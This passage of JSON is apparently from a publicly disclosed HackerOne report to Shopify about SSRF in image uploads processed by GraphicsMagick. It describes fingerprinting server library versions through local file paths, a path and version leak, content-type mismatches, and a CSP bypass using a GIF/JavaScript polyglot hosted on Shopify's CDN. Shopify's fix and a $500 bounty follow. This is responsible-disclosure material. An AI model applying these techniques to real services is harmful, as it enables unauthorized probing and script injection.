class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe following pictures allow us to fingerprint the versions of libraries installed on your server (these three files are present on your servers):\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e/usr/share/doc/libpng12-dev/examples/pngtest.png (you have libpng12-dev installed, etc.)\u003c/li\u003e\n\u003cli\u003e/usr/share/doc/libfreetype6/tutorial/metrics.png \u003c/li\u003e\n\u003cli\u003e/usr/share/doc/libexpat1-dev/expat.html/expat.png\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":51,"voters":["jub0bs","sp1d3rs","rhynorater","nirvana_msu","un4gi","sameerphad72","chaosbolt","cuso4","tungpun","eveeez","and 41 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1651636,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. Our engineering team is investigating the issue.\n\n","markdown_message":"\u003cp\u003eThank you for your report. Our engineering team is investigating the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-03T15:20:54.175Z","updated_at":"2017-05-03T15:20:54.175Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1652142,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As I was testing again today, I would like to add some more information to this bug report, although some of it might be separate issues, but still related to the file upload. Let me know if you want me to open a separate bug report for any of them. The following issues are all related to the image avatar upload (not the product image upload I tested before):\n\n1. The image avatar upload for profiles is also prone to the described image upload SSRF issue.\n\n2. When Uploading a file with file extension .png, content-type image/png and file content of a TIFF file, the server converts the image with GraphicsMagick. When the resulting file is downloaded again, it includes a comment in the TIFF file content. GraphicsMagick leaks the local path and the exact version of GraphicsMagick. The following string is part of the file content:\n\n/tmp/gmi7JIsA GraphicsMagick 1.4 snapshot-20160531 Q8 http://www.GraphicsMagick.org/\n\n3. Content-Type mismatch are pretty common. Uploading a tiff image content as image/png works and the response includes \"Content-Type: image/png\", but the file that is actually downloaded is a tiff image.\n\n4. A generic CSP bypass is possible as https://cdn.shopify.com is whitelisted in the CSP header and it is possible to upload a file that is a valid GIF image and a valid JavaScript. Such a file is described on http://www.thinkfu.com/blog/gifjavascript-polyglots . I succesfully uploaded that file and although GraphicsMagick will transform it, it stays a valid GIF image and JavaScript file. The file on the CDN domain can be found here: https://cdn.shopify.com/s/files/1/1943/0493/users/1DwldMePolyGifCspBypass0aLr.gif?v=1493836174\n","markdown_message":"\u003cp\u003eAs I was testing again today, I would like to add some more information to this bug report, although some of it might be separate issues, but still related to the file upload. Let me know if you want me to open a separate bug report for any of them. The following issues are all related to the image avatar upload (not the product image upload I tested before):\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eThe image avatar upload for profiles is also prone to the described image upload SSRF issue.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWhen Uploading a file with file extension .png, content-type image/png and file content of a TIFF file, the server converts the image with GraphicsMagick. When the resulting file is downloaded again, it includes a comment in the TIFF file content. GraphicsMagick leaks the local path and the exact version of GraphicsMagick. The following string is part of the file content:\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e/tmp/gmi7JIsA GraphicsMagick 1.4 snapshot-20160531 Q8 \u003ca title=\"http://www.graphicsmagick.org/\" href=\"/redirect?url=http%3A%2F%2Fwww.graphicsmagick.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.graphicsmagick.org/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eContent-Type mismatch are pretty common. Uploading a tiff image content as image/png works and the response includes \u0026quot;Content-Type: image/png\u0026quot;, but the file that is actually downloaded is a tiff image.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eA generic CSP bypass is possible as \u003ca title=\"https://cdn.shopify.com\" href=\"/redirect?url=https%3A%2F%2Fcdn.shopify.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cdn.shopify.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is whitelisted in the CSP header and it is possible to upload a file that is a valid GIF image and a valid JavaScript. Such a file is described on \u003ca title=\"http://www.thinkfu.com/blog/gifjavascript-polyglots\" href=\"/redirect?url=http%3A%2F%2Fwww.thinkfu.com%2Fblog%2Fgifjavascript-polyglots\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.thinkfu.com/blog/gifjavascript-polyglots\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e . I succesfully uploaded that file and although GraphicsMagick will transform it, it stays a valid GIF image and JavaScript file. The file on the CDN domain can be found here: \u003ca title=\"https://cdn.shopify.com/s/files/1/1943/0493/users/1DwldMePolyGifCspBypass0aLr.gif?v=1493836174\" href=\"/redirect?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F1943%2F0493%2Fusers%2F1DwldMePolyGifCspBypass0aLr.gif%3Fv%3D1493836174\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cdn.shopify.com/s/files/1/1943/0493/users/1DwldMePolyGifCspBypass0aLr.gif?v=1493836174\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2017-05-03T18:43:36.002Z","updated_at":"2017-05-03T18:43:36.002Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1755882,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any updates on this one?","markdown_message":"\u003cp\u003eAny updates on this one?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-14T17:34:51.964Z","updated_at":"2017-06-14T17:34:51.964Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1777827,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for your report! We have recently deployed a fix for this issue.\n\nOur next round of bounty decisions will take place next week, so we will be in touch with you again soon.","markdown_message":"\u003cp\u003eThank you again for your report! We have recently deployed a fix for this issue.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place next week, so we will be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-23T21:21:30.232Z","updated_at":"2017-06-23T21:21:30.232Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"floyd","url":"/floyd"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1784399,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-27T13:51:41.907Z","updated_at":"2017-06-27T13:51:41.907Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"floyd","url":"/floyd"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1784400,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @floyd, thanks for reporting this issue. We've fixed the issue by adding a mime type validation before parsing an image with graphicks magic. We're awarding 500$ since this is consistent with how we rewarded similar issues in the past.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/floyd\"\u003e@floyd\u003c/a\u003e, thanks for reporting this issue. We\u0026#39;ve fixed the issue by adding a mime type validation before parsing an image with graphicks magic. We\u0026#39;re awarding 500$ since this is consistent with how we rewarded similar issues in the past.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-27T13:51:55.288Z","updated_at":"2017-06-27T13:51:55.288Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1802573,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bug bounty. I can confirm the issue is fixed.","markdown_message":"\u003cp\u003eThanks for the bug bounty. I can confirm the issue is fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-04T19:36:17.930Z","updated_at":"2017-07-04T19:36:17.930Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1849722,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-19T13:34:36.504Z","updated_at":"2017-07-19T13:34:36.504Z","first_to_agree":true,"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2013732,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-22T09:09:19.472Z","updated_at":"2017-09-22T09:09:19.472Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2013733,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-22T09:09:19.550Z","updated_at":"2017-09-22T09:09:19.550Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}